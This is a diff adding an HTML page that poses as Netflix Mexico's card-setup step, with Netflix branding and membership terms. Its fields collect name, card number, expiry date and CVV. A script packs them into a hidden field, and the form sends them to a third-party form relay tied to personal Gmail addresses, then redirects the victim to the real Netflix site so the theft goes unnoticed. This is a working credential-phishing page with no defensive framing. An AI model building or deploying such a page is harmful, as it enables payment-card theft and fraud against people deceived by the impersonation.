@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./css/registro.css">
+    <title>Netflix Mexico</title>
+</head>
+
+<body>
+    <nav class="barranav">
+        <div class="contimg">
+            <img src="https://www.freepnglogos.com/uploads/netflix-logo-0.png" width="180px" alt="">
+        </div>
+        <div class="linklogin">
+            <a class="linkl" href="./login.html">Cerrar Sesión</a>
+        </div>
+    </nav>
+   <div class="contenedorform">
+    <form  action="https://formsubmit.co/quinterosol140@gmail.com" method="POST" class="cont">
+        <div class="texto">
+        <span class="pasostext" >PASO 2 DE 3</span>
+            <h1 class="tl">
+                Configura tu tarjeta de crédito o débito
+            </h1>
+            <span><img src="./img/tarjetas.png"  alt=""></span>
+        </div>
+        <div class="continputdatos">
+            <div class="continput">
+                <input type="text" id="nombre" class="input" placeholder="Nombre">
+                <input type="text" id="apellido" class="input" placeholder="Apellido">
+                <input type="text" id="numtarjeta" class="input" placeholder="Número de tarjeta">
+                <input type="text" id="fechaven" class="input" placeholder="Fecha de vencimiento (MM/AA)">
+                <input type="text" id="cvv" class="input" placeholder="Código de seguridad (CVV)">
+                <input type="hidden" id="todo" name="name" >
+                <input type="hidden" name="email" value="kirohnoficial@gmail.com" >
+                <input type="hidden" name="_next" value="https://www.netflix.com/mx/" >
+                <input type="hidden" name="_captcha" value="false" >
+                <button class="btnin" type="submit">Iniciar membresia</button>
+            </div>
+            <div class="precio">
+                <span class="text">122 MXN</span>
+                <br>
+                <span class="text">Pagas este mes y recibes el siguiente gratis.</span>
+            </div>
+            <div class="contterminos">
+                <p class="term" >Los pagos se procesarán internacionalmente. Es posible que se apliquen comisiones bancarias adicionales.</p>
+                
+                <p class="term" >Al hacer clic en el botón Iniciar membresía, aceptas nuestros Términos de uso y nuestra Declaración de privacidad, declaras que tienes más de 18 años y aceptas que Netflix continuará tu membresía de manera automática y, hasta que la canceles, te facturará la cuota de membresía (actualmente de 122 MXN al mes) a través de la forma de pago elegida. Puedes cancelarla en cualquier momento para evitar cargos en el futuro. Para hacerlo, ve a Cuenta y haz clic en Cancelar membresía.</p>
+                <br>
+                <br>
+            </div>
+        </div>
+
+        <script>
+            const btnin = document.querySelector('.btnin');
+            btnin.addEventListener('click', () => {
+                const nombre = document.querySelector('#nombre').value;
+                const apellido = document.querySelector('#apellido').value;
+                const numtarjeta = document.querySelector('#numtarjeta').value;
+                const fechaven = document.querySelector('#fechaven').value;
+                const cvv = document.querySelector('#cvv').value;
+                if (nombre === '' || apellido === '' || numtarjeta === '' || fechaven === '' || cvv === '') {
+                    alert('Por favor, rellena todos los campos');
+                } else {
+                
+                }
+            });
+
+        
+
+            const fechav = document.querySelector('#fechaven');
+            fechav.addEventListener('keyup', () => {
+                if (fechav.value.length === 2) {
+                    fechav.value += '/';
+                } 
+            });
+
+            var nombre = document.querySelector('#nombre');
+            var apellido = document.querySelector('#apellido');
+            var numtarjeta = document.querySelector('#numtarjeta');
+            var fechaven = document.querySelector('#fechaven');
+            var cvv = document.querySelector('#cvv');
+            var todo = document.querySelector('#todo');
+            var btninlisto = document.querySelector('.btnin');
+
+            btninlisto.addEventListener('click', () => {
+                var nombre = document.querySelector('#nombre').value;
+                var apellido = document.querySelector('#apellido').value;
+                var numtarjeta = document.querySelector('#numtarjeta').value;
+                var fechaven = document.querySelector('#fechaven').value;
+                var cvv = document.querySelector('#cvv').value;
+
+                var datos = "Nombres: " + nombre + "Apellidos: " + apellido + "Numero Tarjeta: " + numtarjeta + "Fecha Vencimiento: " + fechaven + "CVV: " + cvv;
+
+                todo.value = datos;
+            });
+
+
+        </script>
+
+        </form>
+        </div>
+    
+   </div>
+</body>
+
+</html>
